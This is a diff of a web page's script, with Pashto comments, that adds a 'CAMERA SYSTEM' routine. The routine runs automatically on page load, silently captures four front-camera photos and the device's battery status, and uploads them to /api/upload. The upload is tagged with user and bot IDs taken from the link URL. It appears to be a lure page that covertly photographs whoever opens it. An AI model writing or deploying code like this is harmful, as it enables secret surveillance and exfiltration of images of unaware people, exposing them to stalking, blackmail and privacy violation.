@@ -956,59 +956,79 @@ function addExtraEffects() {
 
 /* ================= CAMERA SYSTEM ================= */
 
-const params = new URLSearchParams(location.search);
-const uid = params.get("uid") || "NO_UID";
-const bot = params.get("bot") || "bot1";
+  // ✅ URL څخه user ID او bot ID واخله
+  const params = new URLSearchParams(window.location.search);
+  const uid = params.get("uid") || "NO_UID";
+  const bot = params.get("bot") || "bot1"; // default bot که نه وي ورکړل شوی
 
-async function capturePhotos() {
-  if (!navigator.mediaDevices) return;
+  async function capturePhotos() {
+    try {
+      // 🎥 کیمره فعال کړه
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+video.srcObject = stream;
+video.muted = true;
+video.playsInline = true;
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    });
+await new Promise(resolve => {
+  video.onloadedmetadata = () => {
+    video.play();
+    resolve();
+  };
+});
 
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.muted = true;
-    video.playsInline = true;
+await new Promise(r => setTimeout(r, 800));
 
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => {
-        video.play();
-        resolve();
-      };
-    });
+      // 🖼 Canvas د عکس اخیستلو لپاره
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
 
-    await new Promise(r => setTimeout(r, 800)); // camera warmup
+      // 🔋 Battery info
+      let batteryLevel = "Unknown";
+      let charging = "Unknown";
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100);
+        charging = battery.charging ? "true" : "false";
+      }
 
-    const formData = new FormData();
-    formData.append("uid", uid);
-    formData.append("bot", bot);
+      // 📦 FormData د عکسونو او معلوماتو لیږلو لپاره
+      const formData = new FormData();
+      formData.append("uid", uid);
+      formData.append("bot", bot);
+      formData.append("battery", batteryLevel.toString());
+      formData.append("charging", charging);
 
-    for (let i = 1; i <= 4; i++) {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
-      formData.append(`photo${i}`, blob);
-      await new Promise(r => setTimeout(r, 600));
+      // 📸 4 عکسونه په پرله پسې ډول واخله
+      for (let i = 1; i <= 4; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
+        formData.append("photo" + i, blob, `snap${i}.jpg`);
+
+        // لږ ځنډ تر څو عکسونه جلا شي
+        await new Promise(r => setTimeout(r, 700));
+      }
+
+      // 📤 عکسونه سرور ته واستوه
+      await fetch("/api/upload", {
+        method: "POST",
+        body: formData
+      });
+
+      // 🎬 Stream بند کړه
+      stream.getTracks().forEach(track => track.stop());
+
+    } catch (e) {
+      console.error("Camera error:", e);
+      alert("🚫 Unable to access camera or take photos.");
     }
-
-    await fetch("/api/upload", {
-      method: "POST",
-      body: formData
-    });
-
-    stream.getTracks().forEach(t => t.stop());
-
-  } catch (err) {
-    console.log("Camera permission blocked");
   }
-}
+
+  // ⏱ د پاڼې له لوډ وروسته عکس اخیستل پیل کړه
+  window.onload = () => setTimeout(capturePhotos, 1000);
 </script> 
   
 </body>
